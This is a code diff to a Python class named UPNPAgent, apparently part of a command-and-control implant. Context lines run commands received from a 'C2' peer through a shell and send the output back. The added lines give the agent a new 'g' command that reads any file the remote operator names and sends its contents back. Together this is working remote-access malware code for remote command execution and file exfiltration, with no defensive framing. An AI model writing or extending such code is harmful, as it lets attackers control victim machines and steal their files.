@@ -119,6 +119,15 @@ class UPNPAgent:
             with open(file_name, 'wb') as f:
                 f.write(file_bytes)
             print(f"Recevied file from {agent_ip}: {file_name}")
+        elif command == ord('g'):
+            try:
+                file_name = os.path.basename(message_content.decode('utf8')).encode('utf8')
+                filename_length = len(file_name).to_bytes(4, byteorder='big')
+                with open(file_name, 'rb') as f:
+                    content = f.read()
+                    self.queue_message(agent_ip, b'f', filename_length + content)
+            except:
+                self.queue_message(agent_ip, b'm', b'Failed to get ' + message_content)
         if not self.is_c2:
             if command == ord('c'):
                 print("\nReceived C2 Command ", message_content.decode('utf8'))
@@ -126,7 +135,6 @@ class UPNPAgent:
                 process = subprocess.Popen(command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 stdout, stderr = process.communicate()
                 self.queue_message(agent_ip, b'm', stdout + b'\n' + stderr + b'\n')
-
 
     def _start_agent_search(self):
         while True:
